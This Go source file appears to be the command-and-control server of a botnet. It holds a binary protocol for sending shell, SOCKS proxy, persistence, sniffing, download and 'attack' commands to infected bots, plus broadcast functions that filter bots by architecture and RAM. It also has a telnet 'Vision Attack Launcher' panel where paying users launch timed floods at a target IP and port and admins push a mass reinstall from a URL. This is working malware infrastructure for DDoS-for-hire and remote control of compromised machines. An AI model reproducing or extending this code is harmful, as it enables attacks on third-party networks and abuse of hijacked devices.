package main

import (
	"bufio"
	"fmt"
	"net"
	"strconv"
	"strings"
	"time"
)

// ============================================================================
// BINARY COMMAND PROTOCOL
// Maps text commands to compact binary packets: [0xFF][cmd_id][len_hi][len_lo][args]
// Must match CMD_* constants in bot/bot.h
// ============================================================================

const cmdMagic = 0xFF

var cmdMap = map[string]byte{
	"!shell":      0x01,
	"!exec":       0x01, // alias
	"!stream":     0x02,
	"!detach":     0x03,
	"!bg":         0x03, // alias
	"!info":       0x04,
	"!socks":      0x05,
	"!stopsocks":  0x06,
	"!socksauth":  0x07,
	"!pty":        0x08,
	"!ptydata":    0x09,
"!persist":    0x0A,
	"!attack":     0x0B,
	"!stopattack": 0x0C,
	"!reinstall":    0x0D,
	"!kill":         0x0E,
	"!lolnogtfo":    0x0E, // alias
	"!exit":         0x0F,
	"!updatefetch":  0x10,
	"!download":   0x1C,
	"!ssh":        0x20,
	"!stopssh":    0x21,
	"!http":       0x22,
	"!stophttp":   0x23,
	"!sniff":      0x24,
	"!stopsniff":  0x25,
	// NOTE: !upload intentionally omitted — sent as raw text to avoid
	// the 64KB binary packet length limit truncating large base64 payloads.
}

// encodeCommand converts a text command ("!shell whoami") into a binary packet.
// Returns nil if the command is not recognized (caller should send as text fallback).
// EZF3: no XOR encryption — the transport layer (ChaCha20 + HMAC) handles all crypto.
func encodeCommand(command string) []byte {
	parts := strings.SplitN(strings.TrimSpace(command), " ", 2)
	if len(parts) == 0 {
		return nil
	}
	cmdName := strings.ToLower(parts[0])
	cmdID, ok := cmdMap[cmdName]
	if !ok {
		return nil
	}
	args := ""
	if len(parts) > 1 {
		args = parts[1]
	}
	argsLen := len(args)
	if argsLen > 0xFFFF {
		argsLen = 0xFFFF
		args = args[:argsLen]
	}

	pkt := make([]byte, 4+argsLen)
	pkt[0] = cmdMagic
	pkt[1] = cmdID
	pkt[2] = byte(argsLen >> 8)
	pkt[3] = byte(argsLen & 0xFF)
	copy(pkt[4:], []byte(args))
	return pkt
}

// ============================================================================
// BOT COMMAND DISTRIBUTION
// Functions for sending commands to bots (broadcast or targeted).
// Handle command routing, error recovery, and response tracking.
// ============================================================================

// sendToBots broadcasts a command to ALL authenticated bots
// Thread-safe: uses RLock to allow concurrent command sends
// Failed sends trigger async bot removal (don't block other sends)
// Logs command with sent count vs total for verification
// Used by shell commands, SOCKS proxy, and bot management
func sendToBots(command string) {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	sentCount := 0

	for _, botConn := range botConnections {
		if botConn.authenticated {
			pkt := encodeCommand(command)
			var err error
			if pkt != nil {
				err = botConn.conn.WriteFrame(pkt)
			} else {
				err = botConn.conn.WriteFrame([]byte(command + "\n"))
			}
			if err != nil {
				logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
				go removeBotConnection(botConn.botID)
			} else {
				sentCount++
			}
		}
	}

}

// sendToFilteredBots sends a command to bots matching the specified filters
// archFilter: filter by architecture (empty = all)
// minRAM: minimum RAM in MB (0 = no filter)
// maxBots: max bots to send to (0 = all)
// Returns the count of bots sent to
func sendToFilteredBots(command string, archFilter string, minRAM int64, maxBots int) int {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	sentCount := 0
	for _, botConn := range botConnections {
		if !botConn.authenticated {
			continue
		}

		// Apply architecture filter
		if archFilter != "" && botConn.arch != archFilter {
			continue
		}

		// Apply minimum RAM filter
		if minRAM > 0 && botConn.ram < minRAM {
			continue
		}

		// Apply max bots limit
		if maxBots > 0 && sentCount >= maxBots {
			break
		}

		pkt := encodeCommand(command)
		var err error
		if pkt != nil {
			err = botConn.conn.WriteFrame(pkt)
		} else {
			err = botConn.conn.WriteFrame([]byte(command + "\n"))
		}
		if err != nil {
			logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
			go removeBotConnection(botConn.botID)
		} else {
			sentCount++
		}
	}

	filterDesc := ""
	if archFilter != "" {
		filterDesc += fmt.Sprintf(" arch=%s", archFilter)
	}
	if minRAM > 0 {
		filterDesc += fmt.Sprintf(" minRAM=%dMB", minRAM)
	}
	if maxBots > 0 {
		filterDesc += fmt.Sprintf(" max=%d", maxBots)
	}
	if filterDesc == "" {
		filterDesc = " (no filters)"
	}

	return sentCount
}

// sendToSingleBot sends a command to a specific bot by ID (for TUI use)
// Sets up commandOrigin for TUI shell response routing
func sendToSingleBot(botID string, command string) bool {
	botConnsLock.RLock()
	defer botConnsLock.RUnlock()

	for id, botConn := range botConnections {
		if id == botID || strings.HasPrefix(id, botID) {
			if botConn.authenticated {
				pkt := encodeCommand(command)
				var err error
				if pkt != nil {
					err = botConn.conn.WriteFrame(pkt)
				} else {
					err = botConn.conn.WriteFrame([]byte(command + "\n"))
				}
				if err != nil {
					logMsg("[ERROR] Failed to send to bot %s: %v", botConn.botID, err)
					go removeBotConnection(botConn.botID)
					return false
				}
				// Track last command for ack visibility
				botConn.lastCommand = command
				if len(botConn.lastCommand) > 40 {
					botConn.lastCommand = botConn.lastCommand[:40] + "..."
				}
				botConn.lastCmdTime = time.Now()
				return true
			}
		}
	}
	return false
}

func handleRequest(conn net.Conn) {
	defer conn.Close()

	conn.Write([]byte{255, 251, 1})  // IAC WILL ECHO
	conn.Write([]byte{255, 251, 3})  // IAC WILL SGA
	conn.Write([]byte{255, 252, 34}) // IAC WONT LINEMODE
	conn.Write([]byte(getConsoleTitleAnsi("☾℣☽")))

	reader := bufio.NewReader(conn)

	if authed, c := authUser(conn, reader); authed {
		showBanner(conn)
		botsStr := "unlimited"
		if c.user.MaxBots > 0 {
			botsStr = fmt.Sprintf("%d", c.user.MaxBots)
		}
		conn.Write([]byte(fmt.Sprintf("\033[0m\r  \033[38;5;118m✅ Logged in as \033[1m%s\033[0m \033[38;5;118m| Level: %s | Methods: %d | Max Time: %ds | Slots: %d | Bots: %s\r\n",
			c.user.Username, c.getLevelString(), len(c.user.Methods), c.user.MaxTime, c.user.Concurrents, botsStr)))

		for {
			running := getUserAttackCount(c.user.Username)
			fmt.Fprintf(conn, "\n\r\033[38;5;146m[\033[38;5;161m%s\033[38;5;146m]\033[38;5;245m(%d/%d)\033[38;5;82m► \033[0m",
				c.user.Username, running, c.user.Concurrents)

			readString, err := reader.ReadString('\n')
			if err != nil {
				return
			}
			readString = strings.TrimSuffix(readString, "\r\n")
			readString = strings.TrimSuffix(readString, "\n")

			parts := strings.Fields(readString)
			if len(parts) < 1 {
				continue
			}
			command := strings.ToLower(parts[0])

			switch command {
			case "help", "?":
				showTelnetHelp(conn, c)

			case "methods":
				conn.Write([]byte("\033[1;36m  Your methods:\033[0m\r\n"))
				for _, m := range c.user.Methods {
					conn.Write([]byte(fmt.Sprintf("    \033[1;32m•\033[0m %s\r\n", m)))
				}

			case "bots":
				conn.Write([]byte(fmt.Sprintf("\033[38;5;27m[\033[38;5;15mBots\033[38;5;73m: \033[38;5;15m%d\033[38;5;27m]\r\n", getBotCount())))

			case "clear", "cls":
				conn.Write([]byte("\033[2J\033[H"))
				showBanner(conn)

			case "stopall", "stop":
				attacks := getUserAttacks(c.user.Username)
				if len(attacks) == 0 {
					conn.Write([]byte("\033[1;33m⚠ No running attacks to stop\r\n\033[0m"))
				} else {
					conn.Write([]byte("\033[1;31m\r\n  ╔══════════════════════════════════════════════╗\r\n"))
					conn.Write([]byte("  ║           ⛔ STOPPING ALL ATTACKS            ║\r\n"))
					conn.Write([]byte("  ╠══════════════════════════════════════════════╣\r\n"))
					for _, a := range attacks {
						remaining := a.Duration - int(time.Since(a.Start).Seconds())
						if remaining < 0 {
							remaining = 0
						}
						conn.Write([]byte(fmt.Sprintf("  ║  \033[0m\033[38;5;203m✖ %s → %s:%s (%ds left)\033[1;31m%s║\r\n",
							a.Method, a.Target, a.Port, remaining,
							strings.Repeat(" ", 46-len(fmt.Sprintf("  ✖ %s → %s:%s (%ds left)", a.Method, a.Target, a.Port, remaining))))))
					}
					conn.Write([]byte("  ╚══════════════════════════════════════════════╝\033[0m\r\n"))
					stopped := stopUserAttacks(c.user.Username)
					sendToFilteredBots("!stopattack", "", 0, c.user.MaxBots)
					conn.Write([]byte(fmt.Sprintf("\033[1;32m  ✅ Stopped %d attack(s)\r\n\033[0m", stopped)))
					PushActivity("stop", fmt.Sprintf("[telnet] %s stopped %d attacks", c.user.Username, stopped))
				}

			case "ongoing", "running":
				attacks := getUserAttacks(c.user.Username)
				if len(attacks) == 0 {
					conn.Write([]byte("\033[1;33m⚠ No running attacks\r\n\033[0m"))
				} else {
					conn.Write([]byte("\033[1;36m\r\n  ╔══════════════════════════════════════════════╗\r\n"))
					conn.Write([]byte("  ║           ⚡ YOUR RUNNING ATTACKS            ║\r\n"))
					conn.Write([]byte("  ╠══════════════════════════════════════════════╣\033[0m\r\n"))
					for i, a := range attacks {
						elapsed := int(time.Since(a.Start).Seconds())
						remaining := a.Duration - elapsed
						if remaining < 0 {
							remaining = 0
						}
						conn.Write([]byte(fmt.Sprintf("\033[1;36m  ║\033[0m  \033[1;32m%d.\033[0m \033[1;97m%s\033[0m → \033[1;33m%s\033[0m:\033[1;33m%s\033[0m  \033[38;5;245m%ds/%ds\033[0m  \033[38;5;203m%ds left\033[1;36m\r\n",
							i+1, a.Method, a.Target, a.Port, elapsed, a.Duration, remaining)))
					}
					conn.Write([]byte("\033[1;36m  ╚══════════════════════════════════════════════╝\033[0m\r\n"))
				}

			case "reinstall":
				if c.user.GetLevel() < Admin {
					conn.Write([]byte("\033[1;31m❌ Admin only\r\n\033[0m"))
					continue
				}
				if len(parts) < 2 {
					conn.Write([]byte("\033[1;33mUsage: reinstall <url>\r\n\033[0m"))
					continue
				}
				reinstallURL := parts[1]
				sendToBots("!reinstall " + reinstallURL)
				botCount := getBotCount()
				conn.Write([]byte(fmt.Sprintf("\033[1;32m⚡ Reinstall sent to %d bots → %s\r\n\033[0m", botCount, reinstallURL)))
				PushActivity("reinstall", fmt.Sprintf("[telnet] %s triggered reinstall on %d bots → %s", c.user.Username, botCount, reinstallURL))

			case "logout", "exit":
				conn.Write([]byte("\033[38;5;27mGoodbye.\r\n"))
				return

			default:
				// Attack syntax: <method> <target> <port> <duration>
				method := command
				if !userHasMethod(c.user, method) {
					conn.Write([]byte(fmt.Sprintf("\033[1;31m❌ Unknown command or method not available: %s\r\n\033[0m", method)))
					continue
				}
				if len(parts) < 4 {
					conn.Write([]byte(fmt.Sprintf("\033[1;33mUsage: %s <target> <port> <duration>\r\n\033[0m", method)))
					continue
				}

				target := parts[1]
				port := parts[2]
				durStr := parts[3]
				duration, err := strconv.Atoi(durStr)
				if err != nil || duration <= 0 {
					conn.Write([]byte("\033[1;31m❌ Invalid duration\r\n\033[0m"))
					continue
				}

				// Enforce max time
				if duration > c.user.MaxTime {
					conn.Write([]byte(fmt.Sprintf("\033[1;31m❌ Duration exceeds your limit (%ds max)\r\n\033[0m", c.user.MaxTime)))
					continue
				}

				// Enforce concurrents
				running := getUserAttackCount(c.user.Username)
				if running >= c.user.Concurrents {
					conn.Write([]byte(fmt.Sprintf("\033[1;31m❌ Concurrent limit reached (%d/%d). Wait for an attack to finish.\r\n\033[0m", running, c.user.Concurrents)))
					continue
				}

				// Build bot command
				botCmd := fmt.Sprintf("!attack %s %s %s %s", method, target, port, durStr)

				// Append any extra options (key=value pairs)
				if len(parts) > 4 {
					botCmd += " " + strings.Join(parts[4:], " ")
				}

				sentCount := sendToFilteredBots(botCmd, "", 0, c.user.MaxBots)
				addUserAttack(c.user.Username, method, target, port, duration)

				conn.Write([]byte(fmt.Sprintf("\033[1;32m⚡ Sent %s → %s:%s for %ds to %d bots\r\n\033[0m",
					method, target, port, duration, sentCount)))
				PushActivity("attack", fmt.Sprintf("[telnet] %s fired %s → %s:%s %ds", c.user.Username, method, target, port, duration))
			}
		}
	}
}

func userHasMethod(u User, method string) bool {
	for _, m := range u.Methods {
		if strings.EqualFold(m, method) {
			return true
		}
	}
	return false
}

func showTelnetHelp(conn net.Conn, c *client) {
	conn.Write([]byte("\r\n\033[1;97m╔═══════════════════════════════════════════════════╗\r\n"))
	conn.Write([]byte("\033[1;97m║            \033[1;36mVision Attack Launcher\033[1;97m                 ║\r\n"))
	conn.Write([]byte("\033[1;97m╠═══════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;32mAttack:\033[0m  <method> <target> <port> <duration>     \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;32mExample:\033[0m udpplain 1.2.3.4 80 120                 \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m╠═══════════════════════════════════════════════════╣\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mmethods\033[0m      - List your available methods         \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mbots\033[0m         - Show connected bot count             \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mongoing\033[0m      - Show your running attacks             \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mstopall\033[0m      - Stop all your attacks                 \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mreinstall\033[0m    - Mass reinstall all bots (admin)      \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mclear\033[0m        - Clear screen                        \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m║  \033[1;33mlogout\033[0m       - Disconnect                           \033[1;97m║\r\n"))
	conn.Write([]byte("\033[1;97m╠═══════════════════════════════════════════════════╣\r\n"))
	botsDisplay := "all"
	if c.user.MaxBots > 0 {
		botsDisplay = fmt.Sprintf("%d", c.user.MaxBots)
	}
	conn.Write([]byte(fmt.Sprintf("\033[1;97m║  \033[1;36mMax Time:\033[0m %-5d  \033[1;36mSlots:\033[0m %-3d  \033[1;36mBots:\033[0m %-5s       \033[1;97m║\r\n",
		c.user.MaxTime, c.user.Concurrents, botsDisplay)))
	conn.Write([]byte("\033[1;97m╚═══════════════════════════════════════════════════╝\r\n\033[0m"))
}
